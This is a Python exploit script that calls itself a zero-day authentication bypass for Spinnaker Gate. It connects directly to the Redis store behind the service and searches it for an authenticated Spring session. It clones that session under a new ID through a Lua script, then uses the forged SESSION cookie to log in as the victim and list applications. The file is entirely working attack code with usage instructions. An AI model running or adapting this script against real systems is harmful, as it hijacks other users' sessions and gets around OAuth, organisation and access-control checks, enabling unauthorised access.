#!/usr/bin/env python3
"""
CVE-XXXX: Spring Session Security Context Injection
0-Day: Authentication Bypass via Redis Session Manipulation

Spinnaker Gate stores Spring Security context in Redis sessions.
When a session is loaded, the security context is trusted WITHOUT
re-validating OAuth2 token, org membership, or domain restriction.

By writing a forged session to Redis, an attacker can bypass ALL
authentication checks including:
- OAuth2 org membership (GithubProviderTokenServices.checkOrganization)
- Domain restriction (hasAllUserInfoRequirements)
- Provider requirements (hasAllProviderRequirements)
- Fiat RBAC (FiatSessionFilter)

REQUIREMENTS:
- Redis access (direct, SSRF, or shared infrastructure)
- Valid authenticated session to clone (or crafted serialized Java object)

USAGE:
  # With direct Redis access:
  python3 session_injection_exploit.py --gate https://gate:8084 --redis redis-host:6379

  # With source session to clone:
  python3 session_injection_exploit.py --gate https://gate:8084 --redis redis-host:6379 --source-session UUID
"""
import argparse
import base64
import socket
import time
import uuid
import sys

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("pip install requests")
    sys.exit(1)

class RedisClient:
    def __init__(self, host, port=6379):
        self.host = host
        self.port = port
        self.sock = None
    
    def connect(self):
        self.sock = socket.create_connection((self.host, self.port), timeout=10)
    
    def send_command(self, *args):
        cmd = f"*{len(args)}\r\n"
        for arg in args:
            arg_str = str(arg)
            cmd += f"${len(arg_str)}\r\n{arg_str}\r\n"
        self.sock.send(cmd.encode())
        time.sleep(0.3)
        return self.sock.recv(8192)
    
    def send_raw(self, cmd):
        self.sock.send(f"{cmd}\r\n".encode())
        time.sleep(0.3)
        return self.sock.recv(8192)
    
    def ping(self):
        resp = self.send_raw("PING")
        return b"+PONG" in resp
    
    def hkeys(self, key):
        resp = self.send_raw(f"HKEYS {key}")
        return resp
    
    def lua_copy_session(self, src_session, dst_session):
        lua = (
            'EVAL "'
            "local src = KEYS[1] "
            "local dst = KEYS[2] "
            "local fields = redis.call('HKEYS', src) "
            "for i, f in ipairs(fields) do "
            "  local v = redis.call('HGET', src, f) "
            "  redis.call('HSET', dst, f, v) "
            "end "
            "return #fields"
            f'" 2 spring:session:sessions:{src_session} spring:session:sessions:{dst_session}'
        )
        return self.send_raw(lua)
    
    def close(self):
        if self.sock:
            self.sock.close()

def exploit(gate_url, redis_host, redis_port, source_session=None):
    gate = gate_url.rstrip('/')
    
    print(f"[*] Target: {gate}")
    print(f"[*] Redis: {redis_host}:{redis_port}")
    
    # Step 1: Connect to Redis
    print(f"[*] Connecting to Redis...")
    redis = RedisClient(redis_host, redis_port)
    try:
        redis.connect()
        if not redis.ping():
            print("[-] Redis PING failed")
            return
        print("[+] Redis connected")
    except Exception as e:
        print(f"[-] Redis connection failed: {e}")
        return
    
    # Step 2: Find or create source session
    if source_session:
        print(f"[*] Using source session: {source_session}")
        src = source_session
    else:
        # Try to find ANY authenticated session in Redis
        print("[*] Searching for authenticated sessions in Redis...")
        resp = redis.send_raw("KEYS spring:session:sessions:*")
        sessions = [l.decode() for l in resp.split(b'\r\n') if b'spring:session' in l and b'expires' not in l]
        
        for s in sessions[:10]:
            sid = s.split(':')[-1]
            ctx = redis.send_raw(f"HEXISTS spring:session:sessions:{sid} sessionAttr:SPRING_SECURITY_CONTEXT")
            if b":1" in ctx:
                print(f"[+] Found authenticated session: {sid}")
                src = sid
                break
        else:
            print("[-] No authenticated sessions found")
            redis.close()
            return
    
    # Step 3: Create new session with copied auth
    new_session_id = str(uuid.uuid4())
    print(f"[*] Creating injected session: {new_session_id}")
    
    resp = redis.lua_copy_session(src, new_session_id)
    print(f"[+] Session copied: {resp.decode().strip()}")
    
    # Update timestamps
    now_ms = int(time.time() * 1000)
    redis.send_raw(f"HSET spring:session:sessions:{new_session_id} lastAccessedTime {now_ms}")
    
    redis.close()
    
    # Step 4: Use injected session
    cookie = base64.b64encode(new_session_id.encode()).decode()
    print(f"[+] Session cookie: SESSION={cookie}")
    
    s = requests.Session()
    s.verify = False
    
    # Test auth
    r = s.get(f"{gate}/auth/user", cookies={"SESSION": cookie}, timeout=10)
    if r.status_code == 200 and r.text and r.text != 'null':
        user_info = r.json() if r.headers.get('content-type','').startswith('application/json') else {}
        email = user_info.get('email', 'unknown')
        print(f"[+] AUTHENTICATED AS: {email}")
        
        # Test app access
        r2 = s.get(f"{gate}/applications", cookies={"SESSION": cookie}, timeout=10)
        if r2.status_code == 200:
            try:
                apps = r2.json()
                print(f"[+] FULL ACCESS: {len(apps)} applications")
            except:
                print(f"[+] Applications accessible (HTTP 200)")
        
        print(f"\n[!!] CVE-XXXX: SESSION INJECTION BYPASS SUCCESSFUL")
        print(f"[!!] All auth checks bypassed via Redis session manipulation")
        print(f"[!!] Session: SESSION={cookie}")
    else:
        print(f"[-] Auth failed: HTTP {r.status_code}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spring Session Injection Exploit")
    parser.add_argument("--gate", required=True, help="Gate URL")
    parser.add_argument("--redis", required=True, help="Redis host:port")
    parser.add_argument("--source-session", help="Source session UUID to clone")
    args = parser.parse_args()
    
    redis_parts = args.redis.split(':')
    redis_host = redis_parts[0]
    redis_port = int(redis_parts[1]) if len(redis_parts) > 1 else 6379
    
    exploit(args.gate, redis_host, redis_port, args.source_session)
